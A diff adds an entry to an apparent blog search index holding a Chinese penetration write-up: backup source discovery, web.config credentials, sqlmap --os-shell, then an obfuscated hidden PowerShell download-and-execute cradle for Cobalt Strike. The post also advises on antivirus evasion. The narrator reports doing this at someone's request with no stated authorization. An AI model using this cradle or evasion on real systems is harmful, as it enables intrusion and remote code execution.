@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>一次从注入拿到系统权限+内网渗透</title>
+      <link href="/2020/04/23/penetration-test/"/>
+      <url>/2020/04/23/penetration-test/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p>有人来找我叫我帮他<code>Getshell</code></p></blockquote><p><img src="1.png" alt=""></p><h2 id="1-Getshell"><a href="#1-Getshell" class="headerlink" title="1.Getshell"></a>1.Getshell</h2><p>先登上后台看看先，如图：</p><p><img src="2.png" alt=""></p><p><code>yunsee</code>查看一下<code>iis8.5</code>不存在解析漏洞</p><p><img src="3.png" alt=""></p><p>翻后台找到了一个可以上传html的点，没什么用!<br>后台放弃！</p><p><img src="4.png" alt=""></p><p>扫描目录发现了网站备份源码！去看看敏感文件</p><p><img src="5.png" alt=""></p><p><img src="6.png" alt=""></p><p><code>web.config</code>有账号密码，暂时没用，先留着吧。</p><p>看了一下源码没发现什么地方可以利用，准备放弃了，突然想试试<code>SQL注入</code>。</p><p><img src="7.png" alt=""></p><p>那就上<code>sqlmap —os-shell</code>看看吧。</p><p><img src="8.png" alt=""></p><p>普通的权限，上<code>cs</code>操作!</p><pre class=" language-ps"><code class="language-ps">powershell -w hidden -NoExit "$c1='IEX(New-ObjectNet.WebClient).Downlo';$c2='123(''http://x</code></pre><p>这段ps代码简单混淆了一下，不加<code>-w hidden</code>可以过杀软。</p><p>我这的<code>bypass_test.ps1</code>经过了免杀了（ps免杀的工具，以前APT组织也有在用）。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> 渗透入侵 </tag>
+            
+            <tag> 注入 </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> Getshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>记一篇使用流量回溯分析网站被恶意入侵行为</title>
       <link href="/2020/04/22/ji-yi-pian-shi-yong-liu-liang-hui-su-fen-xi-wang-zhan-bei-e-yi-ru-qin-xing-wei/"/>
       <url>/2020/04/22/ji-yi-pian-shi-yong-liu-liang-hui-su-fen-xi-wang-zhan-bei-e-yi-ru-qin-xing-wei/</url>
